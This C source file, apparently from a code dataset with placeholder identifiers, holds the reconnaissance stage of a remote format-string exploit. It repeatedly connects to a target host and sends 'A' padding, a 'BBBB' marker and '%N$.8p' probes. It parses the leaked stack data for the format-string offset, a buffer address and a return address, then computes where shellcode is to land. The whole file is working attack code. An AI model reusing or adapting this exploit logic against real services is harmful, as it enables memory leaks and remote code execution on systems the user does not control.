
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int recvbuf ;
typedef int evilcmd ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 scalar_t__ VAR_4 ;
 int FUNC_0 (char*,int) ;
 scalar_t__ FUNC_1 (char*,unsigned int,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int,int ) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ) ;
 struct hostent* FUNC_6 (char*) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (unsigned int) ;
 int FUNC_9 (char*,int,int) ;
 int VAR_5 ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,char*,int) ;
 scalar_t__ VAR_6 ;
 int FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (char*,char*,int) ;
 int VAR_7 ;
 int FUNC_14 (char*,char*) ;
 int FUNC_15 (char*) ;
 char* FUNC_16 (char*,char*) ;
 scalar_t__ FUNC_17 (char*,int ,int ) ;
 int FUNC_18 (int,char*,int ) ;

void FUNC_19(char *VAR_8, unsigned int VAR_9) {
 char VAR_10[VAR_1], VAR_11[VAR_1], VAR_12[VAR_1],*VAR_13=((void*)0);
 struct hostent *VAR_14;
 struct sockaddr_in VAR_15;
 int VAR_16, VAR_17;

 if((VAR_14=FUNC_6(VAR_8)) == ((void*)0)) {
  FUNC_7(" gethostbyname()");
  FUNC_10("\n");
  FUNC_4(1);
        }

 FUNC_10(" [*] getting target info...\n");
 FUNC_5(VAR_7);

 for(VAR_17=1; VAR_17<50; VAR_17++) {

  FUNC_0(VAR_10, sizeof(VAR_10));

  VAR_16=FUNC_12(VAR_0, VAR_2, 0);

  VAR_15.sin_family = VAR_0;
  VAR_15.sin_port = FUNC_8(VAR_9);
  VAR_15.sin_addr = *((struct in_addr *)VAR_14->h_addr);
  FUNC_0(&(VAR_15.sin_zero), 8);

  FUNC_3(VAR_16, (struct sockaddr *)&VAR_15,
   sizeof(struct sockaddr), VAR_3);

  FUNC_11(VAR_16, VAR_10, sizeof(VAR_10));

  FUNC_9(VAR_11, 0x00, sizeof(VAR_11));
  FUNC_9(VAR_11, 0x41, 496);
  FUNC_14(VAR_11, "BBBBBBBBBBBB");
  FUNC_13(VAR_12, ".%%%u$.8p\n", VAR_17);
  FUNC_14(VAR_11, VAR_12);

  FUNC_18(VAR_16, VAR_11, FUNC_15(VAR_11));
  FUNC_11(VAR_16, VAR_10, sizeof(VAR_10));

  FUNC_2(VAR_16);

  VAR_13 = FUNC_16(VAR_10, ".");

  if(VAR_5 == 0) if(FUNC_16(VAR_13, "42424242")) VAR_5 = VAR_17;

  if(VAR_6 == 0) {
   if(FUNC_16(VAR_13, "0x08")) {
    if(FUNC_1(VAR_8, VAR_9, VAR_17)) {
     VAR_6 = FUNC_17(++VAR_13, 0, 0);
     FUNC_10(" [*] buffer address\t\t: %.8p\n", VAR_6);
     VAR_6 += 350;
     FUNC_10(" [*] shellcode address\t\t: %.8p\n", VAR_6);
    }
   }
  }

  if(VAR_4 == 0) {
   if(FUNC_16(VAR_13, "0xbf")) {
    VAR_4 = FUNC_17(++VAR_13, 0, 0);
    FUNC_10(" [*] basic return address\t: %.8p\n", VAR_4);
   }
  }

  if(VAR_5 != 0 && VAR_6 != 0 && VAR_4 != 0) break;
 }

 if(VAR_6 == 0) {
  FUNC_10(" [*] shellcode address\t\t: not found!\n\n");
  FUNC_4(1);
 }

 if(VAR_4 == 0) {
  FUNC_10(" [*] basic return address\t: not found!\n\n");
  FUNC_4(1);
 }

 FUNC_10("\n");
}
